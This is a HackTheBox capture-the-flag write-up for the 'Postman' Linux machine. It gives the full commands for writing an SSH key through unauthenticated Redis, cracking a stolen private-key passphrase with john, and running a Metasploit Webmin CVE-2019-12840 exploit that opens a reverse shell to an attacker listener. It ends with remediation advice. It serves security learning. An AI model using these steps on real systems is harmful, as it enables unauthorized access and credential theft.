<p align="center">
  <img src="./images/postman.png" alt="Postman — Solved" width="700">
</p>

<h1 align="center">Postman — HackTheBox Write-up</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=flat-square&logo=hackthebox&logoColor=black">
  <img src="https://img.shields.io/badge/OS-Linux-0078D6?style=flat-square&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-4CAF50?style=flat-square">
  <img src="https://img.shields.io/badge/Focus-Redis%20%7C%20Webmin%20RCE-red?style=flat-square">
</p>

| | |
|---|---|
| **Machine** | Postman |
| **Platform** | Hack The Box |
| **OS** | Ubuntu 18.04.3 LTS |
| **Difficulty** | Easy |
| **IP** | `10.129.2.1` |

---

## Attack path summary (TL;DR)

1. **Recon** — Nmap exposes SSH, an Apache website, an **unauthenticated Redis 4.0.9** (port 6379) and **Webmin 1.910** (port 10000).
2. **Foothold** — Abuse the open Redis to write an SSH public key into `redis`'s `authorized_keys` → SSH in as **`redis`**.
3. **Credential theft** — Find `/opt/id_rsa.bak` (Matt's encrypted SSH key) → crack the passphrase with `ssh2john` + john → `computer2008`.
4. **User** — The passphrase is reused as Matt's system password → `su Matt` → **user.txt**.
5. **Root** — Matt can authenticate to **Webmin 1.910**, vulnerable to **CVE-2019-12840** (authenticated RCE in Package Updates) → shell as **root** → **root.txt**.

---

## 1. Reconnaissance

### Nmap

```
nmap -sVC -p- 10.129.2.1 --min-rate 10000

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Reading the results:**
- **6379 — Redis 4.0.9** exposed on the network. If it's unauthenticated, it's a classic write-primitive foothold (SSH key / cron injection).
- **10000 — Webmin 1.910**, a version with known RCEs → keep it for privilege escalation once we have valid Webmin creds.
- 80 is a static personal site (nothing exploitable at first glance), 22 is standard SSH.

---

## 2. Foothold — Redis unauthenticated → SSH key injection

Redis accepts commands without any auth. The technique: write our SSH **public key** into `redis`'s `~/.ssh/authorized_keys` by abusing `CONFIG SET dir` + `dbfilename` + `SAVE`.

### Generate a dedicated key pair

```bash
ssh-keygen -t rsa -f redis_key
```

Wrap the public key with blank lines (so Redis's binary dump doesn't corrupt it) into `key.txt`:

```bash
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
```

### Push the key through Redis

```
┌──(annadif㉿kali)-[~/Documents/HackTheBox/TrackCPTS/Postman]
└─$ redis-cli -h 10.129.2.1 flushall
OK

└─$ redis-cli -h 10.129.2.1 -x set ssh_key < key.txt
OK

└─$ redis-cli -h 10.129.2.1 config set dir /var/lib/redis/.ssh
OK

└─$ redis-cli -h 10.129.2.1 config set dbfilename authorized_keys
OK

└─$ redis-cli -h 10.129.2.1 save
OK
```

> ⚠️ Key point: `dir` is the **directory**, `dbfilename` is the **file** — never merge them. `redis`'s home is `/var/lib/redis` (confirmed via `CONFIG GET dir`), so the `.ssh` folder is `/var/lib/redis/.ssh`. Other paths (`/home/redis`, `/root/.ssh`) return *Permission denied*.

### SSH in as redis

```
└─$ ssh -i redis_key redis@10.129.2.1
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$
```

Foothold obtained as **`redis`**.

---

## 3. Credential theft — Matt's backup key

Post-foothold enumeration for readable private keys / backups:

```
redis@Postman:/home/Matt$ find / -name id_rsa.* 2>/dev/null
/opt/id_rsa.bak
```

`/opt/id_rsa.bak` is world-readable. Its header shows it's an **encrypted** RSA key (`Proc-Type: 4,ENCRYPTED`) → we'll need to crack the passphrase:

```
redis@Postman:/home/Matt$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
...
-----END RSA PRIVATE KEY-----
```

### Convert to a john hash

```bash
ssh2john id_rsa.bak > id_rsa.hash
```

### Crack the passphrase with John

```
┌──(annadif㉿kali)-[~/Documents/HackTheBox/TrackCPTS/Postman]
└─$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
...
computer2008     (id_rsa.bak)
```

**Passphrase:** `computer2008`

---

## 4. User flag

The key's passphrase is **reused as Matt's system password**. From the `redis` shell:

```
redis@Postman:/home/Matt$ su Matt
Password:
Matt@Postman:~$ cat user.txt
fc9ab15812bc9a1104fb2fa34203191d
```

✅ **user.txt** recovered.

> Note: `ssh -i id_rsa.bak Matt@...` directly fails (the key isn't in Matt's `authorized_keys`), so we pivot with `su Matt` from the existing shell.

---

## 5. Root — Webmin 1.910 RCE (CVE-2019-12840)

Webmin listens on **port 10000 (HTTPS)** and Matt can authenticate to it. Version **1.910** is vulnerable to an **authenticated command injection** in the *Package Updates* module (`update.cgi`), executed **as root**.

### Metasploit configuration

```
msf exploit(linux/http/webmin_packageup_rce) > options

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   RHOSTS     10.129.2.1       yes       The target host(s)
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME   Matt             yes       Webmin Username

Payload options (cmd/unix/reverse_perl):
   LHOST  10.10.15.9   yes   The listen address
   LPORT  4444         yes   The listen port

Exploit target:
   0   Webmin <= 1.910
```

> Since Webmin runs over HTTPS, set `SSL true` (and keep `RPORT 10000`).

### Root flag

```
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf exploit(linux/http/webmin_packageup_rce) > exploit
[*] Started reverse TCP handler on 10.10.15.9:4444
[+] Session cookie: f4b1fcc9db7e63192cea826dc423cfb0
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.15.9:4444 -> 10.129.2.1:42748)

id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
b23c14114ba7f1a97c17ae363f0523ba
```

✅ **root.txt** recovered — box **rooted**.

---

## Path recap

```text
Redis 4.0.9 unauthenticated (6379)
   └─ CONFIG SET dir/dbfilename + SAVE → write SSH key → authorized_keys
        └─ SSH as redis
             └─ /opt/id_rsa.bak (Matt's encrypted key) → ssh2john + john → computer2008
                  └─ su Matt (password reuse) → USER
                       └─ Webmin 1.910 (10000/HTTPS) → CVE-2019-12840 authenticated RCE
                            └─ reverse shell as root → ROOT
```

## Remediation

- **Redis**: never expose it unauthenticated on a reachable interface — bind to `127.0.0.1`, enable `requirepass`/ACLs, and enable protected-mode. Run it under an account with no writable `.ssh`.
- **SSH key hygiene**: don't leave private keys (even backups) in world-readable locations like `/opt`; a passphrase from rockyou (`computer2008`) offers no real protection.
- **Password reuse**: the SSH passphrase = the system password = the Webmin password → enforce distinct, strong credentials.
- **Webmin**: upgrade past 1.910 (CVE-2019-12840 patched in later releases), restrict access to port 10000 to trusted admins/networks.
